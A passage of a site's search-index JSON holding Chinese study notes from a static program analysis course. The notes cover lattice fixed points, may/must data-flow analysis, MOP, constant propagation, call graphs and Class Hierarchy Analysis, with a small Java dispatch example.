\u662f\u6709\u7a77\u7684\uff08finite\uff09</li> </ul> <p>\u90a3\u4e48</p> <ul> <li>\u8fed\u4ee3 f(\u22a5), f(f(\u22a5)), \u2026, f<sup>k</sup>(\u22a5) \u53ef\u4ee5\u5f97\u5230\u6700\u5c0f\u4e0d\u52a8\u70b9\uff08least fixed point\uff09\u3002</li> <li>\u8fed\u4ee3 f(T), f(f(T)), \u2026, f<sup>k</sup>(T) \u4ee5\u5f97\u5230\u6700\u5927\u4e0d\u52a8\u70b9\uff08greatest fixed point\uff09\u3002</li> </ul> <p>\u53ef\u4ee5\u8bc1\u660e\uff08\u53c2\u89c1PDF\uff0c\u89c6\u9891 1:25:00\uff09\uff1a</p> <ul> <li>\u4e0d\u52a8\u70b9\u662f\u5b58\u5728\u7684</li> <li>\u4e0d\u52a8\u70b9\u662f\u6700\u5c0f\u4e0d\u52a8\u70b9\uff08\u6700\u4f18\uff09</li> </ul> <p></p> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#relate-iterative-algorithm-to-fixed-point-theorem","title":"Relate Iterative Algorithm to fixed Point Theorem","text":"<p>\u4ee5\u4e0a\u6211\u4eec\u53ea\u662f\u5b9a\u6027\u7684\u63cf\u8ff0\u4e86\u662f\u5426\u80fd\u5f97\u5230\u6700\u4f18\u4e0d\u52a8\u70b9\uff0c\u4f46\u662f\u8fed\u4ee3\u7b97\u6cd5\u600e\u6837\u624d\u80fd\u7b97\u662f\u7b26\u5408\u4e86\u4e0d\u52a8\u70b9\u5b9a\u7406\u7684\u8981\u6c42\u5462\uff1f</p> <p>\u8bc1\u660e\u7565\u3002</p> <p>\u6700\u540e\u6211\u4eec\u518d\u5217\u51fa\u8fd9\u4e09\u4e2a\u95ee\u9898\u4e0e\u5176\u56de\u7b54\uff1a</p> <ul> <li> <p>\u7b97\u6cd5\u662f\u5426\u786e\u4fdd\u4e00\u5b9a\u80fd\u505c\u6b62/\u8fbe\u5230\u4e0d\u52a8\u70b9\uff1f\u80fd\uff01 \u4f1a\u4e0d\u4f1a\u603b\u662f\u6709\u4e00\u4e2a\u89e3\u7b54\uff1f\u53ef\u4ee5\uff01</p> </li> <li> <p>\u5982\u679c\u80fd\u5230\u8fbe\u4e0d\u52a8\u70b9\uff0c\u90a3\u4e48\u662f\u4e0d\u662f\u53ea\u6709\u4e00\u4e2a\u4e0d\u52a8\u70b9\uff1f\u53ef\u4ee5\u6709\u5f88\u591a\u3002 \u5982\u679c\u6709\u591a\u4e2a\u4e0d\u52a8\u70b9\uff0c\u6211\u4eec\u7684\u7ed3\u679c\u662f\u6700\u4f18\u7684\u5417\uff1f\u662f\u7684\uff01</p> </li> <li> <p>\u4ec0\u4e48\u65f6\u5019\u6211\u4eec\u4f1a\u80fd\u5f97\u5230\u4e0d\u52a8\u70b9\uff1f\u6700\u574f\u60c5\u51b5\u4e0b\uff0c\u662f lattice \u7684\u9ad8\u5ea6\u4e0e CFG \u7684\u8282\u70b9\u6570\u7684\u4e58\u79ef\u3002</p> </li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#maymust-analysis-a-lattice-view","title":"May/Must Analysis, A Lattice View","text":"<p>\u65e0\u8bba may \u8fd8\u662f must \u5206\u6790\uff0c\u90fd\u662f\u4ece\u4e00\u4e2a\u65b9\u5411\u5230\u53e6\u4e00\u4e2a\u65b9\u5411\u53bb\u8d70\u3002</p> <p>\uff081\uff09may analysis</p> <p>\u5bf9\u4e8e Data Flow Analysis Applications \u4e2d\u7684 Reaching Definitions Analysis\uff0c\u8be5\u7b97\u6cd5\u91c7\u7528 may \u5206\u6790\uff0c\u8be5\u7b97\u6cd5\u7684 Lattice \u8868\u793a\u5982\u56fe\u53f3\u6240\u793a\u3002</p> <p>\u4e0b\u754c\u4ee3\u8868\u6ca1\u6709\u4efb\u4f55\u53ef\u5230\u8fbe\u7684\u5b9a\u503c\uff0c\u4e0a\u754c\u4ee3\u8868\u6240\u6709\u5b9a\u503c\u90fd\u53ef\u5230\u8fbe\u3002</p> <p>\u4e0b\u754c\u4ee3\u8868 unsafe \u7684\u60c5\u5f62\uff0c\u5373\u6211\u4eec\u8ba4\u4e3a\u65e0\u5230\u8fbe\u5b9a\u503c\uff0c\u53ef\u5bf9\u76f8\u5173\u53d8\u91cf\u7684\u5b58\u50a8\u7a7a\u95f4\u8fdb\u884c\u66ff\u6362\u3002\u4e0a\u754c\u4ee3\u8868 safe but useless \u7684\u60c5\u7eea\uff0c\u5373\u8ba4\u4e3a\u5b9a\u503c\u5fc5\u7136\u5230\u8fbe\uff0c\u4f46\u662f\u8fd9\u5bf9\u6211\u4eec\u5bfb\u627e\u4e00\u4e2a\u53ef\u66ff\u6362\u6389\u7684\u5b58\u50a8\u7a7a\u95f4\u6beb\u65e0\u610f\u4e49\u3002</p> <p>\u800c\u56e0\u4e3a\u6211\u4eec\u91c7\u7528\u4e86 join \u51fd\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u5fc5\u7136\u4f1a\u4ece lattice \u7684\u6700\u5c0f\u4e0b\u754c\u5f80\u4e0a\u8d70\u3002\u800c\u8d8a\u5f80\u4e0a\u8d70\uff0c\u6211\u4eec\u5c31\u4f1a\u5931\u53bb\u66f4\u591a\u7684\u7cbe\u786e\u503c\u3002\u90a3\u4e48\uff0c\u5728\u6240\u6709\u4e0d\u52a8\u70b9\u4e2d\u6211\u4eec\u5bfb\u627e\u6700\u5c0f\u4e0d\u52a8\u70b9\uff0c\u90a3\u4e48\u5c31\u80fd\u5f97\u5230\u7cbe\u786e\u503c\u6700\u5927\u7684\u7ed3\u679c\u3002</p> <p></p> <p>\u5982\u56fe\uff0c\u5047\u8bbe\u4e0a\u56fe\u4ee3\u8868\u662f\u5426\u53ef\u8fbe\uff0c\u4f8b\u5982 {a,b,c} \u4ee3\u8868\u5b9a\u4e49 a,b,c \u5747\u53ef\u8fbe\uff0c\u5982\u679c\u4ee5\u6bd4\u7279\u6570\u7ec4\u8868\u793a\uff0c\u5373\u4e3a 111\uff1b{a,c} \u5219\u4ee3\u8868 a,c \u53ef\u8fbe\uff0c\u6bd4\u7279\u6570\u7ec4\u4e3a 101.</p> <p>\u5982\u679c truth \u4e3a {a,c}\uff0c\u90a3\u4e48\uff0c{a,b,c} \u867d\u7136\u6709\u8bef\u62a5\uff0c\u4f46\u8fd8\u662f safe \u7684\uff0c\u53ea\u662f\u7cbe\u5ea6\u964d\u4f4e\uff0c\u800c\u5176\u4f59\u7684\u7ed3\u679c\u5747\u4e3a unsafe\uff0c\u56e0\u4e3a\u5b58\u5728\u6f0f\u62a5\u3002</p> <p>\u6839\u636e\u4e0a\u8ff0\u7684\u4e0d\u52a8\u70b9\u5b9a\u7406\uff0c\u7ed9\u5b9a\u4e00\u4e2a complete lattice (L, \u2291)\uff0c\u5982\u679c\uff1a</p> <ul> <li>f: L \u2192 L \u662f\u5355\u8c03\u7684\uff08Monotonicity\uff09</li> <li>L \u662f\u6709\u7a77\u7684\uff08finite\uff09</li> </ul> <p>\u90a3\u4e48 may analysis \u6700\u7ec8\u6c42\u51fa\u7684\u4e0d\u52a8\u70b9\u4e00\u5b9a\u662f\u6700\u5c0f\u4e0d\u52a8\u70b9\u3002</p> <p>\u6b63\u5e38\u6765\u8bf4\uff0c\u5728\u5206\u6790\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u8981\u8d70\u5230 safe \u91cc\u5206\u6790\u624d\u6709\u7528\uff0c\u5f53\u7136\u8d8a\u51c6\u8d8a\u6709\u7528\uff0c\u4e5f\u5c31\u662f\u4e0d\u52a8\u70b9\u8d8a\u5c0f\u8d8a\u597d\u3002</p> <p></p> <p>\uff082\uff09must analysis</p> <p>\u5bf9\u4e8e Data Flow Analysis Applications \u4e2d\u7684 Available Expressions Analysis\uff0c\u8be5\u7b97\u6cd5\u91c7\u7528 must \u5206\u6790\uff0c\u8be5\u7b97\u6cd5\u7684 Lattice \u8868\u793a\u5982\u56fe\u505a\u6240\u793a\u3002</p> <p>\u5982\u679c\u4e00\u4e2a\u8868\u8fbe\u5f0f\u662f available \u7684\uff0c\u8bf4\u660e\u8be5\u8868\u8fbe\u5f0f\u53ef\u4ee5\u66ff\u6362\u4e3a\u6700\u540e\u4e00\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\uff0c\u6216\u53ef\u4ee5\u68c0\u6d4b\u5168\u5c40\u901a\u7528\u8868\u8fbe\u5f0f\uff0c\u6211\u4eec\u7528\u201c\u53ef\u4f18\u5316\u7684\u201d\u6765\u7edf\u79f0\u3002</p> <p>\u6b64\u65f6\uff0c\u5982\u56fe\u7684\u4e0a\u754c\uff0c\u5373 <code>11...11</code> \u8868\u793a\u6240\u6709\u8868\u8fbe\u5f0f\u90fd\u662f\u53ef\u4f18\u5316\u7684\uff0c\u8fd9\u663e\u7136\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u56e0\u4e3a\u53ef\u80fd\u628a\u4e0d\u80fd\u4f18\u5316\u7684\u8868\u8fbe\u5f0f\u4f18\u5316\u4e86\uff0c\u800c\u4e0b\u754c <code>00...00</code> \u5219\u8868\u793a\u6240\u6709\u8868\u8fbe\u5f0f\u90fd\u4e0d\u80fd\u4f18\u5316\uff0c\u8fd9\u80af\u5b9a\u662f\u5b89\u5168\u7684\uff0c\u56e0\u4e3a\u4ed6\u5565\u4e5f\u6ca1\u6539\uff0c\u4f46\u4e5f\u662f\u65e0\u7528\u7684\u3002</p> <p>\u56e0\u6b64\u6211\u4eec\u8981\u5728 safe \u7684\u533a\u57df\u91cc\u5bfb\u627e\u4e00\u4e2a\u6700\u5927\u4e0d\u52a8\u70b9\uff0c\u6b64\u65f6\u53ef\u4ee5\u5f97\u5230\u6700\u7cbe\u51c6\u7684\u7ed3\u679c\uff0c\u800c\u4e0a\u6587\u4ecb\u7ecd\u7684\u4e0d\u52a8\u70b9\u5b9a\u7406\uff0cmust analysis \u6c42\u51fa\u7684\u4e00\u5b9a\u662f\u6700\u5927\u4e0d\u52a8\u70b9\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#distributivity-and-mop","title":"Distributivity and MOP","text":"<p>\u6211\u4eec\u5f15\u5165 Meet-Over-All-Paths Solution\uff0c\u5373 MOP\u3002\u5728\u8fd9\u4e2a solution \u4e2d\uff0c\u6211\u4eec\u4e0d\u662f\u6839\u636e\u8282\u70b9\u4e0e\u5176\u524d\u9a71/\u540e\u7ee7\u8282\u70b9\u7684\u5173\u7cfb\u6765\u8fed\u4ee3\u8ba1\u7b97\u6570\u636e\u6d41\uff0c\u800c\u662f \u76f4\u63a5\u67e5\u627e\u6240\u6709\u8def\u5f84\uff0c\u6839\u636e\u6240\u6709\u8def\u5f84\u7684\u8ba1\u7b97\u7ed3\u679c\u518d\u53d6\u4e0a/\u4e0b\u754c\u3002\u8fd9\u4e2a\u7ed3\u679c\u662f\u6700\u7406\u60f3\u7684\u7ed3\u679c\u3002</p> <p> </p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u8fed\u4ee3\u7b97\u6cd5\u662f s3 \u5bf9\u524d\u9a71\u53d6 join \u540e\u8fdb\u884c\u8fdb\u884c f3 \u7684\u8f6c\u79fb\uff0c\u800c MOP \u7b97\u6cd5\u662f\u5bf9\u5230\u8fbe s3 \u4e4b\u540e\uff0cs4 \u4e4b\u524d\u7684\u8def\u5f84\u7ed3\u679c\u53d6 join\u3002</p> <p>\u90a3\u4e48\uff0c\u6211\u4eec\u7684\u8fed\u4ee3\u7b97\u6cd5\u548c MOP \u7b97\u6cd5\u54ea\u4e2a\u66f4\u52a0\u7cbe\u786e\u5462\uff1f</p> <p></p> <p>\u5f53 F \u662f distributive \u7684\u65f6\u5019\uff0c\u4e8c\u8005\u7cbe\u5ea6\u76f8\u540c\uff0c\u5426\u5219\uff0cMOP \u7cbe\u5ea6\u5927\u4e8e\u6211\u4eec\u7684\u8fed\u4ee3\u7b97\u6cd5\u3002</p> <p>Bit-vector or Gen/Kill problems (set unio n /intersection for join/meet) are distributive\uff01</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#constant-propagation","title":"Constant Propagation","text":"<p>TODO \u8fd9\u91cc\u662f\u4f5c\u4e1a\uff0c\u5f85\u8865\u5145</p> <p>\u5f53\u7136\u6709\u4e9b\u95ee\u9898\u4e0b F \u4e0d\u662f distributive \u7684\uff0c\u5982\u5e38\u91cf\u4f20\u64ad\uff08Constant Propagation\uff09\u3002 \u5728\u5e38\u91cf\u4f20\u64ad\u5206\u6790\u4e2d\uff0c\u5176\u6700\u5927\u4e0a\u754c\u662f undefine\uff0c\u56e0\u4e3a\u6211\u4eec\u4e0d\u77e5\u9053\u4e00\u4e2a\u53d8\u91cf\u5230\u5e95\u88ab\u5b9a\u4e49\u4e3a\u4e86\u4ec0\u4e48\u503c\u3002\u6700\u5c0f\u4e0b\u754c\u662f NAC\uff08Not A Constant\uff09\uff0c\u800c\u4e2d\u95f4\u5c31\u662f\u5404\u79cd\u5e38\u91cf\u3002\u8fd9\u662f\u56e0\u4e3a\u5206\u6790\u4e00\u4e2a\u53d8\u91cf\u6307\u5411\u7684\u503c\u662f\u5426\u4e3a\u5e38\u91cf\uff0c\u90a3\u4e48\u8981\u4e48\u5b83\u662f\u540c\u4e00\u4e2a\u503c\uff0c\u8981\u4e48\u5b83\u4e0d\u662f\u5e38\u91cf\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#worklist-algorithm","title":"Worklist Algorithm","text":"<p>worklist \u662f\u8fed\u4ee3\u7b97\u6cd5\u7684\u4f18\u5316\uff0c\u6240\u4ee5\u4e1a\u754c\u4e00\u822c\u90fd\u4e0d\u4f1a\u4f7f\u7528\u8fed\u4ee3\u7b97\u6cd5\uff0c\u800c\u662f\u4f7f\u7528\u4f18\u5316\u7684 worklist \u7b97\u6cd5\u3002</p> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_4","title":"\u8fc7\u7a0b\u95f4\u5206\u6790","text":"<p>\u4e3a\u4ec0\u4e48\u8981\u4f7f\u7528\u8fc7\u7a0b\u95f4\u5206\u6790\uff08Interprocedural Analysis\uff09\uff1f</p> <p>\u5728\u8fc7\u7a0b\u5185\u5206\u6790\u65f6\uff0c\u4ec5\u5bf9\u5355\u4e2a\u65b9\u6cd5\u8fdb\u884c\u9759\u6001\u5206\u6790\uff0c\u82e5\u51fa\u73b0\u4e86\u5bf9\u522b\u7684\u65b9\u6cd5\u7684\u8c03\u7528\uff0c\u4e3a\u4e86\u786e\u4fdd\u5206\u6790\u7684\u6b63\u786e\u6027\uff0c\u53ea\u80fd\u8ba4\u4e3a\u8be5\u8c03\u7528\u53ef\u80fd\u4f1a\u505a\u4efb\u4f55\u4e8b\u60c5\uff0c\u4ece\u800c\u4f7f\u5f97\u5206\u6790\u7ed3\u679c\u4e0d\u591f\u51c6\u786e\u3002</p> <p>\u5bf9\u4e0b\u8ff0\u7a0b\u5e8f\u8fdb\u884c\u5e38\u91cf\u4f20\u64ad\u5206\u6790\u65f6\uff0c\u56fe(a)\u65f6\u8fc7\u7a0b\u5185\u5206\u6790\uff0c\u5f53\u9047\u5230\u65b9\u6cd5\u8c03\u7528\u65f6\uff0c\u5bf9\u8be5\u65b9\u6cd5\u4fdd\u5b88\u5206\u6790\uff0c\u56e0\u6b64\u6700\u7ec8\u5206\u6790\u7ed3\u679c\u5982\u4e0b\uff1a</p> <ul> <li>x = NAC, y = NAC</li> <li>n = NAC</li> </ul> <p>\u4e3a\u4e86\u66f4\u597d\u7684\u7cbe\u5ea6\uff0c\u9700\u8981\u8fdb\u884c\u8fc7\u7a0b\u95f4\u5206\u6790\uff0c\u7531\u4e8e\u4f20\u5165 bar() \u65b9\u6cd5\u7684\u662f\u5e38\u91cf\uff0c\u5176\u8fd4\u56de\u4e5f\u662f\u5e38\u91cf\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0c\u53ef\u5f97\u5206\u6790\u7ed3\u679c\uff1a</p> <ul> <li>x = 42, y = 43</li> <li>n = 10</li> </ul> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#call-graph","title":"Call Graph","text":"<p>Call Graph \u662f\u7a0b\u5e8f\u4e2d\u8c03\u7528\u5173\u7cfb\u7684\u8868\u793a\u65b9\u5f0f\uff0c\u672c\u8d28\u4e0a Call Graph \u662f\u8c03\u7528\u8fb9\u7684\u96c6\u5408\u3002</p> <p>\u8c03\u7528\u8fb9\uff1a\u4ece call-site \u6307\u5411\u76ee\u6807\u65b9\u6cd5\uff08callees\uff09</p> <p>\u6211\u4eec\u8ba4\u4e3a call-site \u5c31\u662f\u8c03\u7528\u65b9\u6cd5\u7684\u70b9\uff0c\u4f8b\u5982 a.foo() \u5c31\u662f\u4e00\u4e2a call-site\u3002</p> <p>Call Graph \u6709\u5f88\u591a\u5e94\u7528\uff1a\u8fc7\u7a0b\u95f4\u5206\u6790\u7684\u57fa\u7840\uff0c\u7a0b\u5e8f\u7684\u4f18\u5316\u3001\u7406\u89e3\u3001debug\u3001\u6d4b\u8bd5 \u2026\u2026</p> <p>\u5bf9\u4e8e\u9762\u5411\u5bf9\u8c61\u7684\u8bed\u8a00\uff08OOPLs\uff09\uff0cCall Graph \u7684\u6784\u9020\u65b9\u5f0f\u6709\u5f88\u591a\uff0c\u672c\u8bfe\u7a0b\u4e3b\u8981\u5173\u6ce8\uff1a</p> <ul> <li>\u7c7b\u5c42\u6b21\u5206\u6790\uff08CHA\uff0cClass Hierarchy Analysis\uff09\uff1a\u6548\u7387\u9ad8</li> <li>\u6307\u9488\u5206\u6790\uff08k-CFA\uff0cPointer Analysis\uff09\uff1a\u7cbe\u786e\u5ea6\u9ad8</li> </ul> <p></p> <p>JAVA \u4e2d\u7684\u65b9\u6cd5\u8c03\u7528\u5171\u6709\u4e94\u79cd\uff0c\u5176\u4e2d invokedynamic \u5728\u6b64\u4e0d\u505a\u8003\u8651\uff1a</p> <ul> <li>Static Call\u3001Special Call\uff1a\u8c03\u7528\u7684\u65b9\u6cd5\u53ef\u5728\u7f16\u8bd1\u65f6\u786e\u5b9a</li> <li>Virtual Call \u7684\u76ee\u6807\u65b9\u6cd5\u9700\u8981\u8fd0\u884c\u65f6\u52a8\u6001\u786e\u5b9a\u7684\uff08\u591a\u6001\uff09</li> </ul> <p>\u56e0\u6b64\uff0c\u6784\u9020\u8c03\u7528\u56fe\u7684\u96be\u70b9\u548c\u5173\u952e\u5728\u4e8e\u5982\u4f55\u5904\u7406 Virtual Call\u3002</p> <p></p> <p>\u5728 Virtual Call \u65f6\uff0c\u662f\u5982\u4f55\u8fdb\u884c Method Dispatch \u7684\u5462\uff1f</p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e\u4e00\u4e2a Virtual Call \u4e3a\uff1a<code>o.f(...)</code>\uff0c\u5176\u5728\u8fd0\u884c\u65f6\u57fa\u4e8e\u4e24\u70b9\u6765 resolve</p> <ul> <li>c\uff1areceiver object \u7684\u7c7b\u578b\uff0c\u5373\u53d8\u91cf o \u6307\u5411\u7684\u5bf9\u8c61\u7684\u7c7b\u578b</li> <li>m\uff1acall-site \u7684\u65b9\u6cd5\u7b7e\u540d\uff0c\u5728\u672c\u8bfe\u7a0b\u4e2d\uff0c\u65b9\u6cd5\u7b7e\u540d\u88ab\u5b9a\u4e49\u4e3a\uff1a</li> </ul> <p></p> <p>\u57fa\u4e8e\u4e0a\u8ff0\u5185\u5bb9\uff0c\u5b9a\u4e49\u65b9\u6cd5 <code>Dispatch(c,m)</code> \u6765\u6a21\u62df\u8fd0\u884c\u65f6\u7684\u65b9\u6cd5\u5206\u6d3e\u3002</p> <p></p> <p>\u5176\u6d41\u7a0b\u53ef\u4ee5\u6982\u62ec\u4e3a\uff0c\u4f18\u5148\u5728\u5f53\u524d\u5bf9\u8c61\u7c7b\u4e2d\u5bfb\u627e\u65b9\u6cd5\uff0c\u82e5\u6ca1\u6709\u627e\u5230\uff0c\u5219\u5728\u5176\u7236\u7c7b\u4e2d\u5bfb\u627e\uff0c\u8fd9\u5c31\u662f Java \u4e2d\u591a\u6001\u7684\u6267\u884c\u903b\u8f91\uff0c\u53ea\u662f\u7528\u5f62\u5f0f\u5316\u7684\u8bed\u8a00\u8868\u8fbe\u51fa\u6765\u800c\u5df2\u3002</p> <pre><code>class A {\n  void foo() {\u2026}\n}\nclass B extends A {\n}\nclass C extends B {\n  void foo() {\u2026}\n  }\n  void dispatch() {\n    A x = new B()\n    x.foo();       // \u6b64\u5904\u662f call-site\uff0c\u53d8\u91cf x \u6267\u884c\u7684\u5bf9\u8c61\u7684\u7c7b\u578b\u662f B\uff0c\u5176\u65b9\u6cd5\u7b7e\u540d\u662f A.foo()\n                                 // \u4e3a\u4ec0\u4e48\u5bf9\u8c61\u7c7b\u578b\u662f B\uff1f\u56e0\u4e3a\u662f new \u7684 B \u5bf9\u8c61\u3002\n                                 // \u4e3a\u4ec0\u4e48\u65b9\u6cd5\u7b7e\u540d\u662f A.foo()? \u56e0\u4e3a\u63a5\u6536\u7c7b\u578b\u662f A\n                                 // Dispatch(B, A.foo()) = A.foo()\n                                 // \u4e3a\u4ec0\u4e48\u8fd4\u56de A.foo()\uff0c\u56e0\u4e3a\u5728\u7c7b\u578b B \u4e2d\u6ca1\u6709\u627e\u5230\u5177\u6709\u76f8\u540c name \u548c descriptor \u7684\u65b9\u6cd5\n                                 // \u4e8e\u662f\u9012\u5f52\u8c03\u7528 Dispatch \u65b9\u6cd5\u5230\u5176\u7236\u7c7b A \u4e2d\u5bfb\u627e\u5177\u6709\u76f8\u540c name \u548c descriptor \u7684\u65b9\u6cd5\uff0c\u800c\u4e14\u521a\u597d\u627e\u5230\uff01\n    A y = new C();\n    y.foo();       // call-site, Dispatch(C, A.foo()) = C.foo()\n                                 // \u5728\u7c7b\u578b C \u4e2d\u76f4\u63a5\u627e\u5230\u4e86\u5177\u6709\u76f8\u540c name \u548c descriptor \u7684\u65b9\u6cd5\n  }\n}\n</code></pre>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#1-cha-class-hierarchy-analysis","title":"\u2460 \u7c7b\u5c42\u6b21\u5206\u6790\uff08CHA, Class Hierarchy Analysis)","text":"<p>IDE \u4e2d\u7684\u7c7b\u578b\u8df3\u8f6c\u7b49\u529f\u80fd\u5c31\u662f\u901a\u8fc7 CHA \u5b9e\u73b0\u7684\uff0c\u8be5\u7b97\u6cd5\u5feb\u4f46\u5e76\u4e0d\u7cbe\u51c6\uff0c\u9002\u7528\u4e8e\u5feb\u901f\u5206\u6790\u5e76\u5bf9\u51c6\u786e\u6027\u6ca1\u6709\u8f83\u9ad8\u7684\u8981\u6c42\u7684\u9886\u57df\u3002</p> <p>\u8be5\u7b97\u6cd5\u9700\u8981\u6240\u6709\u6574\u4e2a\u7a0b\u5e8f\u7684\u7c7b\u7ee7\u627f\u7ed3\u6784\u4fe1\u606f\uff0c\u57fa\u4e8e call site \u5904\u7684 receiver variable \u7684 declared type \u8fdb\u884c\u5206\u6790\uff1a</p> <pre><code>A a = ...\na.foo(); //call site\n</code></pre> <p>\u4e0a\u4f8b\u4e2d\uff1areceiver variable \u662f a\uff0c\u5176 declared type \u662f A\u3002</p> <p>\u8be5\u7b97\u6cd5\u5047\u8bbe\u53d8\u91cf a \u53ef\u80fd\u6307\u5411 A \u6216\u5176\u6240\u6709\u7684\u5b50\u7c7b\uff0c\u8fd9\u79cd\u5047\u8bbe\u4e5f\u610f\u5473\u7740\u8bef\u62a5\u7684\u5b58\u5728\uff0c\u8fd9\u4e5f\u662f\u540e\u7eed\u5b66\u4e60\u6307\u9488\u5206\u6790\u7684\u539f\u56e0\u3002</p> <p>CHA \u901a\u8fc7\u5b9a\u4e49\u65b9\u6cd5 <code>Resolve(cs)</code> \u6765\u8ba1\u7b97 call-site(cs) \u53ef\u80fd\u8c03\u7528\u7684\u76ee\u6807\u65b9\u6cd5\u3002</p> <p></p> <p>\u8be5\u7b97\u6cd5\u5bf9\u65b9\u6cd5\u8c03\u7528\u7684\u7c7b\u578b\u8fdb\u884c\u5206\u7c7b\u8ba8\u8bba\uff1a</p> <ul> <li> <p>\u9759\u6001\u65b9\u6cd5\u8c03\u7528\uff1a\u76ee\u6807\u65b9\u6cd5\u5c31\u662f call-site \u8c03\u7528\u7684\u65b9\u6cd5\uff0c\u56e0\u4e3a Java \u4e2d\u9759\u6001\u8c03\u7528\u662f\u76f4\u63a5\u7528\u7c7b\u540d\u8c03</p> </li> <li> <p>\u7279\u6b8a\u8c03\u7528\uff1a</p> </li> <li> <p>\u79c1\u6709\u51fd\u6570\u3001\u6784\u9020\u51fd\u6570\uff1a\u76f4\u63a5\u53ef\u4ee5\u627e\u5230</p> </li> <li>\u7236\u7c7b\u65b9\u6cd5\uff1a\u9700\u8981\u9012\u5f52\u67e5\u627e</li> </ul> <p>\u56e0\u6b64\uff0c\u4e3a\u4e86\u5f62\u5f0f\u7edf\u4e00\uff0c\u6b64\u5904\u4f7f\u7528 Dispatch \u8868\u793a\u3002</p> <ul> <li>\u865a\u62df\u8c03\u7528\uff1a\u5373\u666e\u901a\u7684\u51fd\u6570\u8c03\u7528\uff0c\u4e0d\u65ad\u5730\u9012\u5f52\u5bfb\u627e\u5b50\u7c7b\u4e2d\u7684\u65b9\u6cd5\u7b7e\u540d\uff0c\u5e76\u5c06\u5176\u52a0\u5165\u5230 target method \u5217\u8868 T \u4e2d\u3002</li> </ul> <p></p> <p>\u5bf9\u4e8e call-site <code>c.foo()</code> \u800c\u8a00\uff0c\u7531\u4e8e\u5176\u6ca1\u6709\u5b50\u7c7b\uff0c\u56e0\u6b64\u53ea\u6709\u4e00\u4e2a\u53ef\u80fd\u7684\u76ee\u6807\u65b9\u6cd5 <code>{C.foo()}</code>\uff1b</p> <p>\u5bf9\u4e8e call-site <code>a.foo()</code> \uff0c\u5bfb\u627e\u81ea\u8eab\u53ca\u6240\u6709\u5b50\u7c7b\u4e2d\u5177\u6709\u76f8\u540c\u65b9\u6cd5\u540d\u548c\u65b9\u6cd5\u63cf\u8ff0\u7684\u65b9\u6cd5\uff0c\u52a0\u5165\u76ee\u6807\u5217\u8868\uff1b</p> <p>\u5bf9\u4e8e call-site <code>b.foo()</code>\uff0c\u9996\u5148\uff0c\u5728 Resolve \u4e2d\uff0c\u4f1a\u5bf9 b \u7684\u58f0\u660e\u7c7b\u578b\uff0c\u4e5f\u5c31\u662f B\uff0c\u53ca\u5176\u6240\u6709\u5b50\u7c7b\uff0c\u6b64\u5904\u5c31\u662f\u5b50\u7c7b C\u3001D\uff0c\u5747\u8c03\u7528 Dispatch \u65b9\u6cd5\uff1a</p> <ul> <li>\u9996\u5148\u8c03\u7528 Dispatch(B,B.foo())\u3002\u5728 Dispatch \u5185\u90e8\uff0c\u5219\u4f1a\u5411\u4e0a\u67e5\u627e\uff0c\u4e5f\u5c31\u662f\u5148\u5728\u5f53\u524d\u7c7b\uff08B\uff09\u4e2d\u5bfb\u627e\u5177\u6709\u76f8\u540c name \u548c descriptor \u7684\u65b9\u6cd5\uff0c\u7531\u4e8e B \u4e2d\u6ca1\u6709\uff0c\u56e0\u6b64\u627e\u5176\u7236\u7c7b A \u4e2d\u662f\u5426\u5b58\u5728\uff0c\u5728 A \u4e2d\u5b58\u5728\uff0c\u5219\u5c06\u627e\u5230\u7684\u7ed3\u679c\u5199\u5165 T \u4e2d\u3002</li> </ul> <p>Dispatch(B,B.foo()) \u65b9\u6cd5\u4e2d\uff0c\u4f3c\u4e4e\u7b2c\u4e8c\u4e2a B \u662f\u6ca1\u6709\u7528\u5230\u7684\u3002</p> <ul> <li> <p>\u968f\u540e\u8c03\u7528 Dispatch(C,B.foo())\uff0c\u5728 C \u4e2d\u5c31\u627e\u5230\u4e86\u76ee\u6807 C.foo()</p> </li> <li> <p>\u540c\u7406\uff0c\u627e\u5230 D.foo()</p> </li> </ul> <p>\u6ce8\u610f\u7406\u89e3 CHA \u7684\u8bef\u62a5\uff0c\u5047\u8bbe\u6b64\u5904\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <pre><code>B b = new B();\nb.foo();\n</code></pre> <p>\u6700\u7ec8 Resolve 